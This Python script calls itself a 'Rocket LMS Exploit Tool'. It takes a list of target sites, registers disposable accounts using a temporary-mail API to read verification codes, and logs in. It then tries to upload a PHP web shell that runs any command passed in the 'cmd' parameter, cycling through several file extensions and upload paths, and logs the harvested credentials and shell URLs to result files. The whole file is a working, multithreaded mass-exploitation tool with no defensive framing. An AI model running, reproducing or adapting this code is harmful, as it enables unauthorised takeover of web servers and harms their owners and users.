#!/usr/bin/env python3
import requests
import os
import re
import sys
import random
import string
import time
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, init
import warnings
import argparse
import json
import threading

# Suppress SSL warnings
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Color setup
r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Style.RESET_ALL

def RandomGenerator(length=4):
    """Generate random string"""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def process_url(url):
    """Process a single URL for Rocket LMS vulnerability"""
    try:
        # Normalize URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Clean URL path
        base_url = url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0]
        full_url = f"https://{base_url}"
        
        print(f"{y}[+] Target: {o}{full_url}")
        
        # Step 1: Register user
        RANDOME = 'shin' + RandomGenerator()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Get registration page
        register_url = f"{full_url}/register"
        try:
            reqs = requests.get(register_url, headers=headers, verify=False, timeout=30)
        except requests.exceptions.SSLError:
            full_url = f"http://{base_url}"
            register_url = f"{full_url}/register"
            reqs = requests.get(register_url, headers=headers, verify=False, timeout=30)
        
        # Check if registration page exists
        if reqs.status_code != 200:
            print(f"{r}[-] Registration page not found: {o}{register_url}")
            return
        
        # Extract tokens and cookies
        token_match = re.search(r'name="_token" value="(.*?)"', reqs.text)
        if not token_match:
            print(f"{r}[-] CSRF token not found {o}{full_url}")
            return
            
        TOKEN = token_match.group(1)
        print(f"{y}[+] CSRF Token: {o}{TOKEN}")
        
        # Prepare cookies
        cookies = {}
        if 'XSRF-TOKEN' in reqs.cookies:
            cookies['XSRF-TOKEN'] = reqs.cookies['XSRF-TOKEN']
        if 'laravel_session' in reqs.cookies:
            cookies['laravel_session'] = reqs.cookies['laravel_session']
        
        # Register new user
        email = f"{RANDOME}@mailto.plus"
        password = RANDOME
        data = {
            '_token': TOKEN,
            'email': email,
            'country_code': '+1',
            'mobile': '',
            'full_name': RANDOME,
            'password': password,
            'password_confirmation': password,
            'timezone': 'Asia/Kolkata',
            'referral_code': '',
            'term': '1',
        }
        
        reg_response = requests.post(
            register_url, 
            data=data, 
            headers=headers, 
            cookies=cookies, 
            verify=False,
            allow_redirects=False,
            timeout=30
        )
        
        if reg_response.status_code != 302:
            print(f"{r}[-] Registration failed {o}{full_url}")
            return
            
        print(f"{y}[+] Registered user: {o}{email} | {password}")
        
        # Get verification code from email
        time.sleep(5)  # Wait for email
        mail_api_url = f"https://tempmail.plus/api/mails/?email={email}"
        
        try:
            mail_response = requests.get(mail_api_url, headers=headers, timeout=30)
            if mail_response.status_code != 200:
                print(f"{r}[-] Failed to retrieve emails {o}{email}")
                return
                
            mail_data = mail_response.json()
            if not mail_data.get('mail_list'):
                print(f"{r}[-] No emails found for {o}{email}")
                return
                
            first_mail = mail_data['mail_list'][0]
            mail_id = first_mail['mail_id']
            
            mail_content_url = f"https://tempmail.plus/api/mails/{mail_id}?email={email}"
            content_response = requests.get(mail_content_url, headers=headers, timeout=30)
            mail_content = content_response.json()
            
            # Extract verification code
            code_match = re.search(r'\b\d{5,6}\b', mail_content.get('text', ''))
            if not code_match:
                print(f"{r}[-] Verification code not found {o}{email}")
                return
                
            code = code_match.group(0)
            print(f"{y}[+] Verification code: {o}{code}")
            
        except Exception as e:
            print(f"{r}[-] Email retrieval error: {o}{str(e)}")
            return
        
        # Verify account
        verify_url = f"{full_url}/verification"
        verify_data = {
            '_token': TOKEN,
            'username': email,
            'code': code,
        }
        
        verify_response = requests.post(
            verify_url, 
            data=verify_data, 
            headers=headers, 
            cookies=cookies, 
            verify=False,
            allow_redirects=False,
            timeout=30
        )
        
        if verify_response.status_code != 302:
            print(f"{r}[-] Verification failed {o}{full_url}")
            return
            
        # Check for successful login
        if 'panel' in verify_response.text.lower() or 'dashboard' in verify_response.text.lower():
            print(f"{g}[+] Success! Credentials: {o}{full_url}/login | {email} | {password}")
            with open('res.txt', 'a') as f:
                f.write(f"{full_url}/login|{email}|{password}\n")
            
            # Step 2: File Upload Exploit
            print(f"{y}[*] Attempting file upload exploit...")
            
            # Try different login paths
            panel_paths = ['/panel', '/filemanager', '/admin', '/dashboard']
            for path in panel_paths:
                login_url = f"{full_url}/login"
                login_data = {
                    '_token': TOKEN,
                    'email': email,
                    'password': password,
                }
                
                # Login to get session
                session = requests.Session()
                login_resp = session.post(
                    login_url,
                    data=login_data,
                    headers=headers,
                    verify=False,
                    allow_redirects=True,
                    timeout=30
                )
                
                # Check if login successful
                if login_resp.status_code != 200 or 'logout' not in login_resp.text.lower():
                    print(f"{r}[-] Login failed for {o}{path}")
                    continue
                    
                print(f"{y}[+] Logged in successfully, trying upload via {o}{path}")
                
                # Try different upload paths
                upload_paths = [
                    f"{full_url}{path}/file-manager/upload",
                    f"{full_url}{path}/media/upload",
                    f"{full_url}{path}/files/upload",
                ]
                
                # Try different shell extensions
                extensions = ['.php', '.php5', '.phtml', '.php74', '.php7']
                
                for upload_url in upload_paths:
                    for ext in extensions:
                        shell_name = f"shell_{RandomGenerator(6)}{ext}"
                        shell_content = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
                        
                        files = {
                            'file': (shell_name, shell_content, 'application/x-php')
                        }
                        
                        try:
                            upload_resp = session.post(
                                upload_url,
                                files=files,
                                headers=headers,
                                verify=False,
                                timeout=30
                            )
                            
                            if upload_resp.status_code == 200:
                                shell_url = f"{full_url}/uploads/{shell_name}"
                                print(f"{g}[+] Shell uploaded: {o}{shell_url}?cmd=id")
                                with open('Result/LMS-shells.txt', 'a') as s:
                                    s.write(f"{shell_url}?cmd=id | {email}:{password}\n")
                                return
                                
                        except Exception as e:
                            print(f"{r}[-] Upload error ({ext}): {o}{str(e)}")
            
            print(f"{r}[-] File upload exploit failed for {o}{full_url}")
        else:
            print(f"{r}[-] Verification failed, manual check required: {o}{full_url}")
            
    except Exception as e:
        print(f"{r}[-] Error processing {url}: {o}{str(e)}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Rocket LMS Exploit Tool')
    parser.add_argument('-l', '--list', required=True, help='File containing list of URLs')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads')
    args = parser.parse_args()
    
    # Banner
    print(f"\n{y}{'='*60}")
    print(f"{y}| {c}Rocket LMS Exploit Tool {y}|")
    print(f"{y}| {c}File Upload & Account Registration {y}|")
    print(f"{y}| {c}ReUpdate from Jendral92 dan Jajaran Sepuh lainnya {y}|")
    print(f"{y}{'='*60}{o}\n")
    
    # Read URLs
    try:
        with open(args.list, 'r') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{r}[-] File not found: {o}{args.list}")
        return
    
    print(f"{y}[*] Loaded {o}{len(urls)} {y}targets")
    print(f"{y}[*] Using {o}{args.threads} {y}threads")
    print(f"{y}[*] Results will be saved to {o}res.txt {y}and {o}Result/LMS-shells.txt")
    print(f"{y}{'-'*60}{o}\n")
    
    # Process URLs
    pool = ThreadPool(args.threads)
    pool.map(process_url, urls)
    pool.close()
    pool.join()
    
    print(f"\n{y}{'='*60}")
    print(f"{y}[+] Scan completed! Results saved to res.txt and Result/LMS-shells.txt")
    print(f"{y}{'='*60}{o}")

if __name__ == "__main__":
    main()